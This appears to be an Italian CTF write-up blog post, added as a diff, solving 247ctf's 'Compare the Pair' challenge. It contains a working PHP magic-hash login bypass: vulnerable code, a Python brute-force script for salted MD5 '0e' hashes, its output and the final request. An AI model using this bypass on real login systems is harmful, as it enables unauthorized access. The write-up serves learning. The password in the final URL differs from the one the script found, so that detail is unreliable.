@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en-us"><head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+   <meta name="description" content="Compare The Pair - WEB Platform: 247ctf Difficoltà: Moderate (Relativo alla piattaforma) Link: https://247ctf.com/ Descrizione Can you identify a way to bypass our login logic? MD5 is supposed to be a one-way function right? In questa CTF ci viene fornito un endpoint in cui viene mostrato il codice sorgente della pagina stessa. Il nostro obiettivo è bypassare la logica di login:
+&lt;?php require_once(&#39;flag.php&#39;); $password_hash = &#34;0e902564435691274142490923013038&#34;; $salt = &#34;f789bbc328a3d1a3&#34;; if(isset($_GET[&#39;password&#39;]) &amp;&amp; md5($salt .">  
+
+  <title>
+    
+      247ctf Compare the Pair
+    
+  </title>
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/" />
+  
+  
+  
+  <link rel="stylesheet" href="/css/main.a297955abb83fd59595e96b41959321a1a28f91e59eedbf6026a3378c597e768c087ae78a19f6150d327e28ab6b217f13d7367fd53ced8fbcd4fdbff3aeed7eb.css" integrity="sha512-opeVWruD/VlZXpa0GVkyGhoo&#43;R5Z7tv2AmozeMWX52jAh654oZ9hUNMn4oq2shfxPXNn/VPO2PvNT9v/Ou7X6w==" />
+  
+</head>
+<body a="auto">
+        <main class="page-content" aria-label="Content">
+            <div class="w">
+                <div class="post-meta">
+                    <a href="/">..</a>
+
+                    <p>
+                        <time datetime="2025-10-19 23:44:44 &#43;0200 CEST">
+                            2025-10-19
+                        </time>
+                    </p>
+                </div>
+
+<article>
+    <h1>247ctf Compare the Pair</h1>
+
+    
+
+    <h1 id="compare-the-pair---web">Compare The Pair - WEB</h1>
+<ul>
+<li><strong>Platform:</strong> 247ctf</li>
+<li><strong>Difficoltà:</strong> Moderate (Relativo alla piattaforma)</li>
+<li><strong>Link:</strong> <a href="https://247ctf.com/">https://247ctf.com/</a></li>
+</ul>
+<h2 id="descrizione">Descrizione</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Can you identify a way to bypass our login logic? MD5 is supposed to be a one-way function right?
+</span></span></code></pre></div><p>In questa CTF ci viene fornito un endpoint in cui viene mostrato il codice sorgente della pagina stessa. Il nostro obiettivo è bypassare la logica di login:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">require_once</span>(<span style="color:#e6db74">&#39;flag.php&#39;</span>);
+</span></span><span style="display:flex;"><span>  $password_hash <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0e902564435691274142490923013038&#34;</span>;
+</span></span><span style="display:flex;"><span>  $salt <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;f789bbc328a3d1a3&#34;</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;password&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">md5</span>($salt <span style="color:#f92672">.</span> $_GET[<span style="color:#e6db74">&#39;password&#39;</span>]) <span style="color:#f92672">==</span> $password_hash){
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> $flag;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>, <span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><h2 id="analisi">Analisi</h2>
+<p>Il codice è strutturalmente molto semplice: la flag si trova nel file &lsquo;flag.php&rsquo; che viene mostrato solo e soltanto se viene soddisfatta questa condizione:</p>
+<p><code>if(isset($_GET['password']) &amp;&amp; md5($salt . $_GET['password']) == $password_hash){</code></p>
+<p>Facendo un HTTP GET alla pagina e impostando il query param &ldquo;password&rdquo;, viene calcolato l&rsquo;hash del parametro e confrontato con quello hardcoded del codice.</p>
+<p>L&rsquo;hash viene calcolato tramite la funzione <code>md5($salt . $_GET['password'])</code>. Dal nome, sappiamo che l&rsquo;algoritmo di hashing utilizzato è MD5 e che il salt è utilizzato concatenandolo alla password fornita come parametro. Per nostra fortuna, sia il salt che l&rsquo;hash della password sono entrambi hardcoded nel codice sorgente.</p>
+<p>Sarebbe semplice utilizzare hashcat per tentare un bruteforce o facendo utilizzo di un dizionario, tuttavia è un metodo poco interessante e soprattutto non abbiamo la certezza di riuscire a ricavare la password in questo modo. Possiamo fare di meglio.</p>
+<h3 id="il-confronto-in-php">Il confronto in PHP</h3>
+<p>Guardando il codice attentamente c&rsquo;è un particolare tanto subdolo quanto pericoloso: il modo in cui è fatto il confronto: quello che può essere un banale operatore di confronto (<code>==</code>) nasconde un&rsquo;insidia che può trarre in inganno molto facilmente.
+PHP ha due modi per verificare se due elementi sono uguali:</p>
+<p>L&rsquo;operatore &ldquo;==&rdquo;:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$a <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>;   <span style="color:#75715e">// Number
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$b <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;5&#34;</span>; <span style="color:#75715e">// String
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">var_dump</span>($a <span style="color:#f92672">==</span> $b); <span style="color:#75715e">// true
+</span></span></span></code></pre></div><p>che controlla se i valori sono uguali dopo la conversione di tipo (type juggling).</p>
+<p>L&rsquo;operatore &ldquo;===&rdquo;:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$a <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>;
+</span></span><span style="display:flex;"><span>$b <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;5&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">var_dump</span>($a <span style="color:#f92672">===</span> $b); <span style="color:#75715e">// false
+</span></span></span></code></pre></div><p>Decisamente più robusto, che controlla sia valore che il tipo di dato.</p>
+<p>Nel nostro caso, il confronto che viene fatto è del primo tipo, quindi gli operandi sono soggetti al type juggling.</p>
+<p>Il type juggling è la conversione automatica di un tipo di dato in un altro  quando necessario (ad esempio nel contesto di un confronto). Non è una caratteristica unica di PHP. Altri linguaggi hanno lo stesso meccanismo ed è particolarmente comodo soprattutto se si utilizza un linguaggio non tipizzato. Ma come possiamo sfruttarlo in questo caso?</p>
+<p>Osserviamo attentamente l&rsquo;hash della password hardcoded: <code>0e902564435691274142490923013038</code></p>
+<p>Come si può notare, è un hash particolare in quanto costituito esclusivamente da numeri ad esclusione della seconda cifra che contiene il carattere <code>e</code>. Questa stringa assomiglia alla rappresentazione scientifica di un numero, in particolare 0 x 10^(902564435691274142490923013038), ovvero 0.
+Questo genere di stringhe in PHP viene definita &ldquo;numeric string&rdquo; e, nel momento in cui le vogliamo confrontare, PHP le converte in numero. Questo significa che, se riusciamo a produrre un hash che sembri una &ldquo;numeric string&rdquo; e quindi un numero in notazione scientifica, non stiamo più confrontando stringhe, ma numeri!</p>
+<p>Per bypassare il login ci serve una password il cui hash (con salt) produca una stringa che inizi per 0e (cioè zero seguito dal carattere <code>e</code>) seguito solo numeri.</p>
+<h2 id="soluzione">Soluzione</h2>
+<p>Passiamo ora a scrivere uno script per poter trovare la password che ci serve. Non sarà la soluzione più efficiente possibile, ma fa il suo lavoro:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>salt <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;f789bbc328a3d1a3&#39;</span>
+</span></span><span style="display:flex;"><span>nonce <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Starting password cracking...&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> nonce <span style="color:#f92672">%</span> <span style="color:#ae81ff">1000</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">and</span> nonce <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Trying nonce: </span><span style="color:#e6db74">{</span>nonce<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>    password <span style="color:#f92672">=</span> salt <span style="color:#f92672">+</span> str(nonce)
+</span></span><span style="display:flex;"><span>    hashed <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>md5(password<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> hashed[:<span style="color:#ae81ff">2</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;0e&#39;</span> <span style="color:#f92672">and</span> hashed[<span style="color:#ae81ff">2</span>:]<span style="color:#f92672">.</span>isdigit():
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Valid password found: </span><span style="color:#e6db74">{</span>nonce<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;Hash: &#39;</span>, hashed)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>    nonce <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>Il suo funzionamento è molto semplice: attraverso una nonce che incrementiamo ad ogni iterazione, verifichiamo se il suo hash corrisponda al pattern che stiamo cercando.</p>
+<p>(Riflettendoci, concettualmente non è tanto diverso dal mining 🙂)</p>
+<h2 id="risultato">Risultato</h2>
+<p>Dopo qualche minuto il nostro script (non particolarmente efficiente) ci mostra una password valida:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Trying nonce: <span style="color:#ae81ff">237694000</span>
+</span></span><span style="display:flex;"><span>Trying nonce: <span style="color:#ae81ff">237695000</span>
+</span></span><span style="display:flex;"><span>Trying nonce: <span style="color:#ae81ff">237696000</span>
+</span></span><span style="display:flex;"><span>Trying nonce: <span style="color:#ae81ff">237697000</span>
+</span></span><span style="display:flex;"><span>Trying nonce: <span style="color:#ae81ff">237698000</span>
+</span></span><span style="display:flex;"><span>Trying nonce: <span style="color:#ae81ff">237699000</span>
+</span></span><span style="display:flex;"><span>Trying nonce: <span style="color:#ae81ff">237700000</span>
+</span></span><span style="display:flex;"><span>Trying nonce: <span style="color:#ae81ff">237701000</span>
+</span></span><span style="display:flex;"><span>Valid password found: <span style="color:#ae81ff">237701818</span>
+</span></span><span style="display:flex;"><span>Hash:  0e668271403484922599527929534016
+</span></span></code></pre></div><p>È importante notare come questa non sia la password corretta, infatti l&rsquo;hash è decisamente diverso da quello che abbiamo:</p>
+<p><code>md5('f789bbc328a3d1a3237701818') -&gt; 0e668271403484922599527929534016 != 0e902564435691274142490923013038</code></p>
+<p>Tuttavia è una numeric string che causa questo comportamento:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>php &gt; echo <span style="color:#e6db74">&#39;0e902564435691274142490923013038&#39;</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;0e668271403484922599527929534016&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 0e902564435691274142490923013038 ovvero 0 x 10 ^ (902564435691274142490923013038) = 0</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 0e668271403484922599527929534016 ovvero 0 x 10 ^ (668271403484922599527929534016) = 0</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 0 == 0</span>
+</span></span></code></pre></div><p>Ovvero PHP le interpreta erroneamente come due numeri in notazione scientifica! Infatti qualunque stringa che segue il formato sarà true:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>php &gt; echo <span style="color:#e6db74">&#39;0e902564435691274142490923013038&#39;</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;0e0&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>php &gt; echo <span style="color:#e6db74">&#39;0e902564435691274142490923013038&#39;</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;0e123&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>php &gt; echo <span style="color:#e6db74">&#39;0e902564435691274142490923013038&#39;</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;0e9999999999999&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>Utilizzando la password trovata dal nostro script come query param (<a href="https://8e2e86060d2436d1.247ctf.com/?password=237701815">https://8e2e86060d2436d1.247ctf.com/?password=237701815</a>) otteniamo il nostro premio:</p>
+<p><img src="/images/ctf/247ctf-compare-the-pair/flag_found.png" alt="FLAG FOUND"></p>
+<h2 id="approfondimenti">Approfondimenti</h2>
+<ul>
+<li><a href="https://www.freecodecamp.org/news/how-php-type-juggling-works-explained-with-code-examples/">How PHP Type Juggling Works – Explained with Code Examples</a></li>
+<li><a href="https://secops.group/php-type-juggling-simplified/">PHP Type Juggling Simplified</a></li>
+<li><a href="https://www.php.net/manual/en/language.types.type-juggling.php">Type Juggling</a></li>
+</ul>
+
+</article>
+
+            </div>
+        </main>
+    </body></html>
